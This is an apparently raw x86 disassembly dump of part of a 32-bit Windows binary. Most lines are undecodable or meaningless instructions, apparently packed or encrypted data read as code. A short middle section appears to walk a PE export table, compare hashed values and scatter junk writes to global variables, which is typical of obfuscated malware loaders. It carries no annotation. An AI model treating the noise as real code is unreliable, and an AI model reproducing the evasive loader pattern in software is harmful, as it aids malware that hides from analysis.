  40cd1b:	lock ffree st(7)
  40cd1e:	jae    0x40cd29
  40cd20:	pop    esp
  40cd21:	pop    ecx
  40cd22:	mov    edi,0xab8a9be8
  40cd27:	out    dx,al
  40cd28:	inc    ecx
  40cd29:	ffree  st(2)
  40cd2b:	les    edi,FWORD PTR [esi]
  40cd2d:	push   esi
  40cd2e:	cmp    eax,0x8a642baf
  40cd33:	mov    edi,0xfef5ade8
  40cd38:	mov    DWORD PTR [ebx-0x1c],0xa42bedba
  40cd3f:	jno    0x40cd2e
  40cd41:	dec    edi
  40cd42:	call   0xae6d12cb
  40cd47:	adc    BYTE PTR [edi+0x7e80219b],bl
  40cd4d:	shl    BYTE PTR [ebp-0x2e],1
  40cd50:	imul   esi,eax,0xe0c69001
  40cd56:	adc    eax,0xa46fa7ae
  40cd5b:	ja     0x40cd09
  40cd5d:	sub    al,0x51
  40cd5f:	jmp    0x4938b6d0
  40cd64:	cmp    edi,DWORD PTR [eax-0x2]
  40cd67:	push   ss
  40cd68:	les    ebx,FWORD PTR [edx+0x1f]
  40cd6b:	adc    al,0x91
  40cd6d:	push   ss
  40cd6e:	sbb    eax,0xb59a1a48
  40cd73:	int    0x94
  40cd75:	in     eax,dx
  40cd76:	sbb    ebx,DWORD PTR [esi]
  40cd78:	fcmovu st,st(3)
  40cd7a:	(bad)  
  40cd7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd7c:	push   edi
  40cd7d:	(bad)  
  40cd7e:	xchg   ecx,eax
  40cd7f:	mov    al,0xac
  40cd81:	mov    BYTE PTR [esi-0x3334070e],ch
  40cd87:	(bad)  
  40cd88:	out    0x70,al
  40cd8a:	aam    0x4
  40cd8c:	sub    al,0x6c
  40cd8e:	sub    esp,DWORD PTR [ecx]
  40cd90:	cs inc eax
  40cd92:	cmp    al,0xc9
  40cd94:	repz es xchg esp,eax
  40cd97:	(bad)  
  40cd98:	repz or eax,0x3d9bf29f
  40cd9e:	and    al,0x1e
  40cda0:	in     al,0xa
  40cda2:	mov    ds:0x7dce04bf,al
  40cda7:	push   ebx
  40cda8:	dec    edx
  40cda9:	add    cl,BYTE PTR ss:[ebp-0x4b]
  40cdad:	mov    ah,0x95
  40cdaf:	iret   
  40cdb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdb1:	mul    BYTE PTR [ecx-0x5a78186]
  40cdb7:	jns    0x40cded
  40cdb9:	push   esp
  40cdba:	ret    0xe593
  40cdbd:	pop    edi
  40cdbe:	cmp    al,BYTE PTR [edx]
  40cdc0:	jecxz  0x40cdb7
  40cdc2:	xchg   edx,eax
  40cdc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdc4:	cmc    
  40cdc5:	mov    ds:0x5c3fb0d4,eax
  40cdca:	inc    edx
  40cdcb:	imul   edi,DWORD PTR [ecx],0x29fa92ff
  40cdd1:	dec    ebx
  40cdd2:	and    bl,ch
  40cdd4:	mov    bh,0xee
  40cdd6:	jo     0x40cdc4
  40cdd8:	in     al,dx
  40cdd9:	jne    0x40ce3e
  40cddb:	push   es
  40cddc:	je     0x40cdc9
  40cdde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cddf:	aas    
  40cde0:	test   ecx,esp
  40cde2:	sub    DWORD PTR [ecx],0xfffffff7
  40cde5:	sub    BYTE PTR [edi-0xfcbf4],dh
  40cdeb:	call   0xdcda:0x1a9a77df
  40cdf2:	mov    bl,0x8a
  40cdf4:	mov    WORD PTR [ebx+edx*1-0xd3b4af7],?
  40cdfb:	cs mov edi,0x6872e1b7
  40ce01:	ds dec eax
  40ce03:	mov    esp,0xa61530c2
  40ce08:	jge    0x40ce5a
  40ce0a:	(bad)  
  40ce0b:	pop    esi
  40ce0c:	(bad)  
  40ce0d:	into   
  40ce0e:	fldcw  WORD PTR [esi+0x5b]
  40ce11:	dec    esp
  40ce12:	or     DWORD PTR [eax-0x33],0x0
  40ce16:	or     ch,BYTE PTR [eax-0x80]
  40ce19:	dec    edx
  40ce1a:	out    dx,al
  40ce1b:	sbb    dl,BYTE PTR [ebx]
  40ce1d:	dec    edx
  40ce1e:	jmp    0x40ce61
  40ce20:	xchg   edx,eax
  40ce21:	push   ecx
  40ce22:	push   cs
  40ce23:	sahf   
  40ce24:	data16 mov al,0x89
  40ce27:	or     dh,al
  40ce29:	aas    
  40ce2a:	push   cs
  40ce2b:	mov    ebx,DWORD PTR ds:0x6d897813
  40ce31:	sub    bh,BYTE PTR [edx-0x36d1b341]
  40ce37:	and    al,dh
  40ce39:	jnp    0x40cdfb
  40ce3b:	mov    ebx,0xc4d4001f
  40ce40:	sub    eax,0x2483eb96
  40ce45:	addr16 cli 
  40ce47:	dec    edi
  40ce48:	or     DWORD PTR [edi-0x5e2183dd],edx
  40ce4e:	or     DWORD PTR [ebx-0x19],ecx
  40ce51:	cmp    eax,0x25216478
  40ce56:	and    al,BYTE PTR ds:0xf0f6e6d4
  40ce5c:	pop    ebx
  40ce5d:	fisub  DWORD PTR [esi+edi*4]
  40ce60:	pop    ss
  40ce61:	mov    dh,0xb6
  40ce63:	jl     0x40ce2f
  40ce65:	mov    edx,0xf92617a3
  40ce6a:	xlat   BYTE PTR ds:[ebx]
  40ce6b:	sbb    DWORD PTR [edx-0x2d],ecx
  40ce6e:	rcr    esp,cl
  40ce70:	sbb    esp,DWORD PTR [edx-0x17b8a5ad]
  40ce76:	xor    eax,0x1e28c1b6
  40ce7b:	sbb    eax,0xf7c45515
  40ce80:	aas    
  40ce81:	sbb    BYTE PTR [ebp+eax*4-0x4c],ah
  40ce85:	das    
  40ce86:	and    edx,ebp
  40ce88:	mov    ds:0xad5c8b79,eax
  40ce8d:	bound  ecx,QWORD PTR ds:0xad42798a
  40ce93:	adc    eax,0xff46670f
  40ce98:	mov    dh,0x71
  40ce9a:	jmp    0x40ce6e
  40ce9c:	lods   al,BYTE PTR ds:[esi]
  40ce9d:	mov    ah,BYTE PTR [esi-0x51cc795c]
  40cea3:	dec    ebp
  40cea4:	mov    esp,0xc826a384
  40cea9:	ret    
  40ceaa:	lea    ebx,[edi]
  40ceac:	fdivr  QWORD PTR [ecx+0x1a]
  40ceaf:	hlt    
  40ceb0:	enter  0x25f5,0x21
  40ceb4:	mov    edi,0xee6aaba4
  40ceb9:	mov    WORD PTR [ebx],?
  40cebb:	call   0x9cd6:0xbc144414
  40cec2:	pop    ecx
  40cec3:	arpl   WORD PTR [esi],bx
  40cec5:	push   ecx
  40cec6:	jae    0x40cefc
  40cec8:	test   BYTE PTR [ebx-0x5eb262d3],ch
  40cece:	cwde   
  40cecf:	sub    DWORD PTR [edx-0x4c911062],esi
  40ced5:	lahf   
  40ced6:	or     al,0x6b
  40ced8:	xor    DWORD PTR [eax+0x78],edi
  40cedb:	adc    ah,BYTE PTR cs:[esi+0x25]
  40cedf:	adc    eax,0x853d8a2
  40cee4:	mov    WORD PTR [eax+0x6d],?
  40cee7:	and    al,0x76
  40cee9:	or     al,BYTE PTR [ebx]
  40ceeb:	mov    ebp,0x522e959d
  40cef0:	fild   DWORD PTR [ecx-0x1b]
  40cef3:	ret    
  40cef4:	fidiv  DWORD PTR [edx-0x4c646520]
  40cefa:	mov    ah,0x4d
  40cefc:	ds out 0x31,eax
  40ceff:	rcl    DWORD PTR [ebx-0x76b31a63],1
  40cf05:	ret    
  40cf06:	mov    ah,0x4a
  40cf08:	aam    0x30
  40cf0a:	jo     0x40ceaf
  40cf0c:	add    al,0x85
  40cf0e:	clc    
  40cf0f:	jge    0x40ceed
  40cf11:	je     0x40cf3e
  40cf13:	sub    BYTE PTR [esi],al
  40cf15:	in     eax,0xb6
  40cf17:	test   ebx,edx
  40cf19:	inc    edx
  40cf1a:	and    DWORD PTR [ebx],0xffffffd2
  40cf1d:	xor    eax,0xe81cc7c9
  40cf22:	mov    bh,0x68
  40cf24:	not    BYTE PTR [esp+esi*8-0x616f53cf]
  40cf2b:	pop    ebp
  40cf2c:	or     al,0xf
  40cf2e:	ins    BYTE PTR es:[edi],dx
  40cf2f:	push   ecx
  40cf30:	hlt    
  40cf31:	fisubr DWORD PTR [ecx-0x2cfd4bab]
  40cf37:	push   ds
  40cf38:	js     0x40cf62
  40cf3a:	adc    edx,DWORD PTR [ebx]
  40cf3c:	xchg   edi,eax
  40cf3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf3e:	sbb    eax,0x310304de
  40cf43:	pop    eax
  40cf44:	sub    al,ah
  40cf46:	popa   
  40cf47:	cld    
  40cf48:	xor    eax,0xeb4c0fd8
  40cf4d:	jno    0x40cf1d
  40cf4f:	sbb    BYTE PTR [edi+0x420161ac],ah
  40cf55:	std    
  40cf56:	mov    ds,edx
  40cf58:	mov    cl,0xa8
  40cf5a:	scas   eax,DWORD PTR es:[edi]
  40cf5b:	xchg   ecx,eax
  40cf5c:	sbb    ah,BYTE PTR ds:0x91979ad2
  40cf62:	sbb    DWORD PTR [eax+ebx*2+0x60],ebp
  40cf66:	int    0x1e
  40cf68:	daa    
  40cf69:	push   cs
  40cf6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf6b:	xor    BYTE PTR [edx+0x43099df5],bl
  40cf71:	mov    edi,DWORD PTR [esi+0x33]
  40cf74:	test   BYTE PTR [eax+ebx*1+0x375fe082],0xfc
  40cf7c:	push   ecx
  40cf7d:	mov    DWORD PTR ds:0x8e457e41,eax
  40cf83:	dec    eax
  40cf84:	add    al,0x4c
  40cf86:	outs   dx,DWORD PTR ds:[esi]
  40cf87:	pop    ebp
  40cf88:	nop
  40cf89:	loope  0x40cf16
  40cf8b:	push   ss
  40cf8c:	push   edi
  40cf8d:	les    edx,FWORD PTR [edx+edi*4-0x57]
  40cf91:	call   0xf41f:0x51043e6f
  40cf98:	jmp    0x40cfa6
  40cf9a:	mov    al,ds:0x1b476630
  40cf9f:	and    al,0xd
  40cfa1:	aam    0xf7
  40cfa3:	xor    eax,0xfc5022e
  40cfa8:	xor    al,BYTE PTR [ebx]
  40cfaa:	out    0xa0,al
  40cfac:	push   ecx
  40cfad:	sahf   
  40cfae:	gs sbb al,0xdd
  40cfb1:	iret   
  40cfb2:	cmp    ebp,esi
  40cfb4:	repz jl 0x40cfd7
  40cfb7:	out    dx,al
  40cfb8:	push   cs
  40cfb9:	adc    al,0xca
  40cfbb:	mov    bl,0x76
  40cfbd:	add    eax,0x975241a9
  40cfc2:	sbb    bh,BYTE PTR [edi]
  40cfc4:	mov    ch,0xf7
  40cfc6:	test   DWORD PTR [eax+edx*4-0x48],0x2b58e8bb
  40cfce:	xchg   ebp,eax
  40cfcf:	mov    ebx,0xab599b18
  40cfd4:	inc    edi
  40cfd5:	jno    0x40cfaa
  40cfd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfd8:	or     ebp,ebp
  40cfda:	fisubr DWORD PTR [esi-0x52a31f59]
  40cfe0:	shl    BYTE PTR [eax+0x1b97a8d0],0xb1
  40cfe7:	bound  edi,QWORD PTR [ebx-0x6100579b]
  40cfed:	fs dec esi
  40cfef:	fdiv   QWORD PTR ds:0xb6a5f6b4
  40cff5:	(bad)  
  40cff6:	hlt    
  40cff7:	inc    edx
  40cff8:	jecxz  0x40d018
  40cffa:	(bad)  
  40cffb:	arpl   WORD PTR [ebx+edx*2-0x7c5e688e],bp
  40d002:	cmp    eax,DWORD PTR [ebx-0x20]
  40d005:	inc    esp
  40d006:	sbb    esi,DWORD PTR [eax-0x7ce65f4f]
  40d00c:	mov    ah,0xaf
  40d00e:	int3   
  40d00f:	imul   ebx,DWORD PTR [ebx-0x7ad220ab],0xa
  40d016:	lods   al,BYTE PTR ds:[esi]
  40d017:	pop    ds
  40d018:	int3   
  40d019:	cmp    ebp,DWORD PTR [eax+0x40ad874d]
  40d01f:	rcr    BYTE PTR [ebp-0x17441af4],0xe5
  40d026:	lods   al,BYTE PTR ds:[esi]
  40d027:	hlt    
  40d028:	mov    ecx,0xda891c2c
  40d02d:	mov    ds:0x3dba4984,eax
  40d032:	mul    BYTE PTR [ecx+esi*2]
  40d035:	mov    al,ds:0xfc9959e4
  40d03a:	pop    eax
  40d03b:	dec    esp
  40d03c:	sub    al,0x7c
  40d03e:	clc    
  40d03f:	out    0xf4,eax
  40d041:	ret    0xb74c
  40d044:	mov    eax,ds:0x84fefde1
  40d049:	ds std 
  40d04b:	mov    eax,ds:0x1d0da3ab
  40d050:	out    0xe2,eax
  40d052:	and    ah,BYTE PTR [edi]
  40d054:	mov    cl,0x50
  40d056:	in     al,dx
  40d057:	jae    0x40d0bc
  40d059:	push   esp
  40d05a:	loop   0x40d0bc
  40d05c:	xchg   BYTE PTR [eax+0x11985112],dh
  40d062:	scas   al,BYTE PTR es:[edi]
  40d063:	mov    ecx,DWORD PTR [ebp+0x8]
  40d066:	sbb    DWORD PTR ds:0x42a2b6,0x42a2d2
  40d070:	add    ecx,DWORD PTR [eax+0x24]
  40d073:	and    DWORD PTR ds:0x42a2de,0x1336
  40d07d:	mov    DWORD PTR [ebp-0x34],ecx
  40d080:	mov    eax,DWORD PTR [ebp-0x14]
  40d083:	mov    ecx,DWORD PTR [ebp+0x8]
  40d086:	add    DWORD PTR ds:0x42a276,0x42a2a6
  40d090:	add    ecx,DWORD PTR [eax+0x1c]
  40d093:	mov    DWORD PTR ds:0x42a2ae,0x5cb0
  40d09d:	mov    DWORD PTR [ebp-0x14],ecx
  40d0a0:	mov    DWORD PTR ds:0x42a2f2,0x755c
  40d0aa:	jmp    0x40d194
  40d0af:	or     eax,ecx
  40d0b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40d0b4:	xor    ecx,0x90a
  40d0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40d0bd:	adc    DWORD PTR ds:0x42a28e,0x25cc
  40d0c7:	add    ecx,DWORD PTR [eax+ebx*4]
  40d0ca:	mov    DWORD PTR [ebp-0x28],ecx
  40d0cd:	xor    eax,0x75c
  40d0d2:	mov    eax,DWORD PTR [ebp-0x4]
  40d0d5:	mov    ecx,DWORD PTR [ebp-0x28]
  40d0d8:	xor    eax,esi
  40d0da:	and    DWORD PTR ds:0x42a2ae,0x42a2c2
  40d0e4:	add    eax,edi
  40d0e6:	mov    DWORD PTR ds:0x42a2ea,0x1030
  40d0f0:	cmp    ecx,eax
  40d0f2:	mov    DWORD PTR ds:0x42a2c6,0xfb7
  40d0fc:	je     0x40d194
  40d102:	mov    DWORD PTR ds:0x42a262,0xed5
  40d10c:	jmp    0x40d185
  40d111:	and    DWORD PTR ds:0x42a2e2,0x0
  40d11b:	jmp    0x40d12d
  40d120:	mov    ecx,DWORD PTR ds:0x42a2e2
  40d126:	inc    ecx
  40d127:	mov    DWORD PTR ds:0x42a2e2,ecx
  40d12d:	cmp    DWORD PTR ds:0x42a2e2,0x10
  40d134:	jae    0x40d161
  40d13a:	cmp    DWORD PTR ds:0x42a2e2,0x15
  40d141:	jle    0x40d161
  40d147:	jmp    0x40d15c
  40d14c:	push   0x42a2ae
  40d151:	push   0x429181
  40d156:	call   DWORD PTR ds:0x42a3ca
  40d15c:	jmp    0x40d120
  40d161:	mov    eax,DWORD PTR [ebp-0x4]
  40d164:	mov    ecx,DWORD PTR [ebp-0x8]
  40d167:	xor    eax,esi
  40d169:	add    eax,edi
  40d16b:	cmp    ecx,eax
  40d16d:	mov    eax,DWORD PTR [ebp-0x4]
  40d170:	je     0x40d1cf
  40d176:	mov    ecx,DWORD PTR [ebp-0x30]
  40d179:	xor    eax,esi
  40d17b:	add    eax,edi
  40d17d:	cmp    ecx,eax
  40d17f:	je     0x40d1d8
  40d185:	lea    eax,[ebp-0x8]
  40d188:	push   eax
  40d189:	push   DWORD PTR [ebp-0x28]
  40d18c:	push   DWORD PTR [ebp+0xc]
  40d18f:	call   0x41622a
  40d194:	mov    eax,DWORD PTR [ebp-0x4]
  40d197:	mov    ecx,DWORD PTR [ebp-0x8]
  40d19a:	xor    eax,esi
  40d19c:	add    eax,edi
  40d19e:	cmp    ecx,eax
  40d1a0:	je     0x40d1bb
  40d1a6:	mov    eax,DWORD PTR [ebp-0x34]
  40d1a9:	movzx  eax,WORD PTR [eax+ebx*2]
  40d1ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40d1b0:	mov    eax,DWORD PTR [ecx+eax*4]
  40d1b3:	mov    DWORD PTR [ebp-0x38],eax
  40d1b6:	jmp    0x40d111
  40d1bb:	mov    eax,DWORD PTR [ebp-0xc]
  40d1be:	xor    eax,esi
  40d1c0:	lea    ebx,[ebx+eax*1+0x3272f1]
  40d1c7:	jmp    0x40872d
  40d1cc:	mov    eax,DWORD PTR [ebp-0x4]
  40d1cf:	xor    eax,esi
  40d1d1:	add    eax,edi
  40d1d3:	jmp    0x413da1
  40d1d8:	mov    eax,DWORD PTR [ebp-0x38]
  40d1db:	add    eax,DWORD PTR [ebp+0x8]
  40d1de:	mov    DWORD PTR [ebp-0x18],eax
  40d1e1:	mov    eax,DWORD PTR [ebp-0x1c]
  40d1e4:	test   eax,eax
  40d1e6:	je     0x40f60e
  40d1ec:	mov    DWORD PTR [ebp-0x20],0x0
  40d1f3:	push   0x3
  40d1f5:	xor    edx,edx
  40d1f7:	pop    edx
  40d1f8:	add    edx,0x8
  40d1fb:	push   edx
  40d1fc:	pop    ecx
  40d1fd:	push   0x6
  40d1ff:	dec    ecx
  40d200:	pop    ebx
  40d201:	dec    ebx
  40d202:	xchg   ebx,ecx
  40d204:	sub    ebx,ecx
  40d206:	xchg   ebx,ecx
  40d208:	dec    ecx
  40d209:	mov    eax,DWORD PTR [ebp-0x1c]
  40d20c:	imul   eax,ecx
  40d20f:	sub    esp,eax
  40d211:	mov    DWORD PTR [ebp-0x20],esp
  40d214:	mov    eax,DWORD PTR [ebp-0x4]
  40d217:	xor    eax,esi
  40d219:	add    eax,edi
  40d21b:	jmp    0x40f5e7
  40d220:	mov    ecx,DWORD PTR [ebp-0xc]
  40d223:	mov    eax,DWORD PTR [ebp+0x8]
  40d226:	mov    edx,DWORD PTR [ebp+0x14]
  40d229:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d22d:	xor    ecx,esi
  40d22f:	add    ecx,edi
  40d231:	xor    edx,edx
  40d233:	div    ecx
  40d235:	mov    ecx,DWORD PTR [ebp-0x4]
  40d238:	jmp    0x40f5c6
  40d23d:	adc    esp,DWORD PTR [eax-0x55]
  40d240:	jl     0x40d1c2
  40d242:	mov    eax,0x95ec0084
  40d247:	bound  ebp,QWORD PTR [ecx-0x44]
  40d24a:	pop    esp
  40d24b:	das    
  40d24c:	hlt    
  40d24d:	jmp    0xcc45625
  40d252:	pop    esi
  40d253:	add    DWORD PTR [ebx+0x205b7a08],0xffffff8d
  40d25a:	ret    
  40d25b:	dec    ebp
  40d25c:	push   esp
  40d25d:	lock dec ecx
  40d25f:	inc    ebx
  40d260:	stos   BYTE PTR es:[edi],al
  40d261:	js     0x40d2b5
  40d263:	imul   edi,DWORD PTR [ebx],0x7f
  40d266:	in     al,dx
  40d267:	ret    0x683c
  40d26a:	mov    ds:0xbc0026be,al
  40d26f:	mov    dl,0xc8
  40d271:	mov    ebx,0x5684dc43
  40d276:	call   0x7e16:0xbd1af666
  40d27d:	addr16 clc 
  40d27f:	rcr    BYTE PTR [edi],0x3c
  40d282:	imul   ebp,DWORD PTR [eax+ebx*8-0xb],0x14
  40d287:	xchg   ecx,eax
  40d288:	sub    eax,0x62e4a130
  40d28d:	lods   eax,DWORD PTR ds:[esi]
  40d28e:	add    esi,eax
  40d290:	jb     0x40d219
  40d292:	ja     0x40d219
  40d294:	sub    BYTE PTR [ecx+esi*1-0x515460e4],ch
  40d29b:	test   BYTE PTR [esi],bl
  40d29d:	sar    DWORD PTR [edi-0x72357a94],cl
  40d2a3:	daa    
  40d2a4:	mov    esp,0xcca9646d
  40d2a9:	add    al,0xb0
  40d2ab:	outs   dx,BYTE PTR ds:[esi]
  40d2ac:	push   ss
  40d2ad:	jmp    0xd1f96e4f
  40d2b2:	retf   
  40d2b3:	jp     0x40d23a
  40d2b5:	int3   
  40d2b6:	pop    DWORD PTR [ecx-0x61]
  40d2b9:	sbb    al,0xf4
  40d2bb:	xchg   ebx,eax
  40d2bc:	push   ss
  40d2bd:	gs mov ebx,0xa1ae23a6
  40d2c3:	(bad)  
  40d2c4:	adc    BYTE PTR [ecx-0x48],dl
  40d2c7:	jnp    0x40d272
  40d2c9:	mov    ch,0x43
  40d2cb:	fnsave fs:[esi+0x594a5376]
  40d2d2:	out    dx,al
  40d2d3:	xor    eax,0x6f6ab72b
  40d2d8:	dec    ebp
  40d2d9:	xchg   DWORD PTR ds:0x94d3831,esp
  40d2df:	mov    ebx,0x3ca5a9a1
  40d2e4:	mov    bh,0x47
  40d2e6:	mov    ch,0x6c
  40d2e8:	sub    cl,cl
  40d2ea:	(bad)  
  40d2eb:	arpl   WORD PTR [ebx+edi*8-0x3e],cx
  40d2ef:	add    ch,al
  40d2f1:	repz aad 0xf5
  40d2f4:	lea    esp,[edi-0x50f237a7]
  40d2fa:	dec    esi
  40d2fb:	shr    bl,1
  40d2fd:	fs cmp ebp,ebp
  40d300:	jns    0x40d2be
  40d302:	dec    eax
  40d303:	test   DWORD PTR [ecx],ecx
  40d305:	icebp  
  40d306:	arpl   WORD PTR [edi+0x3d],di
  40d309:	js     0x40d2cb
  40d30b:	mov    bl,0x9c
  40d30d:	push   ebx
  40d30e:	test   DWORD PTR [ebx+0x3b],esi
  40d311:	jl     0x40d363
  40d313:	lods   eax,DWORD PTR ds:[esi]
  40d314:	(bad)  ds:0x9565331c
  40d31a:	(bad)  
  40d31b:	in     eax,dx
  40d31c:	mov    ecx,0x1fc3492e
  40d321:	xchg   ecx,eax
  40d322:	stc    
  40d323:	out    dx,al
  40d324:	sti    
  40d325:	and    BYTE PTR [edx+0x24],0x5b
  40d329:	mov    BYTE PTR [ecx+0x2b70fe86],dl
  40d32f:	jge    0x40d2ec
  40d331:	adc    eax,0x6d3e5786
  40d336:	ficom  DWORD PTR [edi+0x42d9fad6]
  40d33c:	mov    es,WORD PTR [ebx+0x35]
  40d33f:	sub    DWORD PTR [esi+0x17],0xfffcf29d
  40d346:	sub    BYTE PTR [edx+0x72aca3d8],al
  40d34c:	and    eax,0x32ef5091
  40d351:	xlat   BYTE PTR ds:[ebx]
  40d352:	inc    ecx
  40d353:	push   esi
  40d354:	scas   al,BYTE PTR es:[edi]
  40d355:	mov    bh,BYTE PTR [ecx+edx*2]
  40d358:	fdiv   DWORD PTR [ecx-0x73]
  40d35b:	cmc    
  40d35c:	jmp    0x2355:0xc10f959b
  40d363:	aad    0x6b
  40d365:	add    al,0xb1
  40d367:	retf   
  40d368:	ret    
  40d369:	mov    ebp,0x9d71d744
  40d36e:	jmp    0x42da:0x564b2d7d
  40d375:	or     BYTE PTR [ebx+0x29],0x1f
  40d379:	add    edx,ebp
  40d37b:	jno    0x40d3b1
  40d37d:	int    0x4a
  40d37f:	mov    ebx,0x35ffc023
  40d384:	stos   DWORD PTR es:[edi],eax
  40d385:	(bad)  
  40d386:	inc    ebx
  40d387:	test   edx,esi
  40d389:	fistp  WORD PTR [ecx+0x7]
  40d38c:	mov    WORD PTR cs:[ebx+edx*2-0x1b87e01c],gs
  40d394:	arpl   di,di
  40d396:	xor    esi,ecx
  40d398:	and    BYTE PTR [esi],bh
  40d39a:	leave  
  40d39b:	not    DWORD PTR [ebx-0x2b52a8c0]
  40d3a1:	jle    0x40d365
  40d3a3:	mov    bh,0x9
  40d3a5:	dec    edx
  40d3a6:	int    0x48
  40d3a8:	fst    QWORD PTR [ecx]
  40d3aa:	jg     0x40d39d
  40d3ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3ad:	xor    ecx,ecx
  40d3af:	es jmp 0xe771:0x6c44441a
  40d3b7:	pop    edx
  40d3b8:	lods   eax,DWORD PTR ds:[esi]
  40d3b9:	or     BYTE PTR [ebp+0x25ffac3f],ah
  40d3bf:	test   al,0x86
  40d3c1:	das    
  40d3c2:	stos   BYTE PTR es:[edi],al
  40d3c3:	out    0x5f,al
  40d3c5:	cmp    BYTE PTR [eax+0x43],0xce
  40d3c9:	mov    ch,0xb3
  40d3cb:	nop
  40d3cc:	shld   DWORD PTR [edx-0x36cde191],ecx,cl
  40d3d3:	hlt    
  40d3d4:	sar    DWORD PTR [ecx],0x9
  40d3d7:	push   es
  40d3d8:	jbe    0x40d3fc
  40d3da:	loope  0x40d436
  40d3dc:	cdq    
  40d3dd:	sti    
  40d3de:	add    al,0x9a
  40d3e0:	lods   al,BYTE PTR ds:[esi]
  40d3e1:	mov    edx,0x108471d0
  40d3e6:	or     al,0x92
  40d3e8:	int3   
  40d3e9:	push   esi
  40d3ea:	add    DWORD PTR [ecx-0x22],esp
  40d3ed:	mov    bh,0xed
  40d3ef:	cmp    dh,BYTE PTR [edx-0x1ef0ad6d]
  40d3f5:	cmp    al,0x1a
  40d3f7:	mov    edx,0x1740d46c
  40d3fc:	push   esi
  40d3fd:	mov    ds:0xc71f2ae,al
  40d402:	aaa    
  40d403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d404:	fcomip st,st(5)
  40d406:	repnz popa 
  40d408:	je     0x40d39c
  40d40a:	xor    eax,0xbb5e5ccc
  40d40f:	adc    al,dh
  40d411:	jae    0x40d3d3
  40d413:	pop    edi
  40d414:	ins    BYTE PTR es:[edi],dx
  40d415:	inc    edi
  40d416:	jns    0x40d448
  40d418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d419:	pop    eax
  40d41a:	popa   
  40d41b:	mov    dl,0xe7
  40d41d:	cmp    eax,0xcbdfa1ff
  40d422:	mov    esp,0xdb5cb7b0
  40d427:	pop    ebx
  40d428:	pop    esp
  40d429:	bound  ebp,QWORD PTR [ebp+0x57]
  40d42c:	shr    eax,1
  40d42e:	push   esp
  40d42f:	adc    eax,0x5965d8b6
  40d434:	shl    BYTE PTR [esi+0x346679d7],cl
  40d43a:	clc    
  40d43b:	pop    ds
  40d43c:	in     eax,dx
  40d43d:	aas    
  40d43e:	inc    esi
  40d43f:	icebp  
  40d440:	push   cs
  40d441:	push   ebp
  40d442:	es stos DWORD PTR es:[edi],eax
  40d444:	jl     0x40d3e8
  40d446:	sub    al,BYTE PTR [ecx-0xd]
  40d449:	shl    dl,1
  40d44b:	rcr    DWORD PTR [esi-0x721049ed],0x2
  40d452:	rcr    BYTE PTR [ebx],1
  40d454:	(bad)  
  40d455:	repz mov ah,0x11
  40d458:	js     0x40d3f5
  40d45a:	or     BYTE PTR [eax+0x14],0x8e
  40d45e:	and    esp,DWORD PTR [eax+edi*1-0x4284ff1d]
  40d465:	repnz out 0xb3,eax
  40d468:	xor    BYTE PTR [eax+0x30],ah
  40d46b:	mov    edx,0x6cdaa276
  40d470:	add    DWORD PTR [ebx],0x24
  40d473:	pop    es
  40d474:	xchg   ecx,eax
  40d475:	and    al,0xa5
  40d477:	std    
  40d478:	xor    al,0x3c
  40d47a:	mov    al,0x39
  40d47c:	pop    edx
  40d47d:	das    
  40d47e:	add    ebp,DWORD PTR [ebp-0x22]
  40d481:	xor    al,0x3d
  40d483:	js     0x40d461
  40d485:	clc    
  40d486:	neg    BYTE PTR [ebx+0x4f078ab3]
  40d48c:	pop    eax
  40d48d:	dec    edi
  40d48e:	mov    eax,ds:0x2c3a5ad9
  40d493:	pop    es
  40d494:	push   edi
  40d495:	adc    cl,bh
  40d497:	pop    ds
  40d498:	jae    0x40d4cf
  40d49a:	xchg   esp,eax
  40d49b:	add    DWORD PTR [esi-0x7d],edx
  40d49e:	pop    ecx
  40d49f:	clc    
  40d4a0:	ror    dl,0x88
  40d4a3:	shl    edx,1
  40d4a5:	sub    DWORD PTR [ecx],esi
  40d4a7:	stos   DWORD PTR es:[edi],eax
  40d4a8:	lds    edi,FWORD PTR fs:[edi+0x7b]
  40d4ac:	lods   eax,DWORD PTR ds:[esi]
  40d4ad:	test   DWORD PTR [edi+0x798163bc],ecx
  40d4b3:	cmp    edx,ebp
  40d4b5:	test   BYTE PTR fs:[edx+edi*1],ch
  40d4b9:	pusha  
  40d4ba:	and    BYTE PTR [ebx],bh
  40d4bc:	retf   
  40d4bd:	ja     0x40d4ab
  40d4bf:	pop    ss
  40d4c0:	sub    DWORD PTR [ecx-0x4601583f],edx
  40d4c6:	cmp    ah,BYTE PTR [ecx-0x74]
  40d4c9:	packuswb mm2,QWORD PTR [edx]
  40d4cc:	jbe    0x40d52c
  40d4ce:	and    ecx,DWORD PTR ds:0x56e6d63b
  40d4d4:	in     al,dx
  40d4d5:	pop    ebx
  40d4d6:	xlat   BYTE PTR ds:[ebx]
  40d4d7:	stos   DWORD PTR es:[edi],eax
  40d4d8:	add    al,0xea
  40d4da:	int    0x35
  40d4dc:	scas   eax,DWORD PTR es:[edi]
  40d4dd:	sahf   
  40d4de:	fucomp st(3)
  40d4e0:	sub    BYTE PTR [esi],ah
  40d4e2:	cmp    DWORD PTR [edi+0x57938abc],edi
  40d4e8:	ret    
  40d4e9:	test   al,0x1c
  40d4eb:	scas   al,BYTE PTR es:[edi]
  40d4ec:	test   BYTE PTR [ecx],bl
  40d4ee:	imul   esi,DWORD PTR [ecx],0x4e
  40d4f1:	cmp    bl,BYTE PTR [esi-0x587f2a8f]
  40d4f7:	xor    eax,0x7630256d
  40d4fc:	pop    ss
  40d4fd:	jecxz  0x40d507
  40d4ff:	inc    eax
  40d500:	test   eax,0xa3904ae2
  40d505:	push   edx
  40d506:	jmp    0xe555:0x2cd812ab
  40d50d:	es mov al,0x76
  40d510:	xchg   esp,esi
  40d512:	fs scas al,BYTE PTR es:[edi]
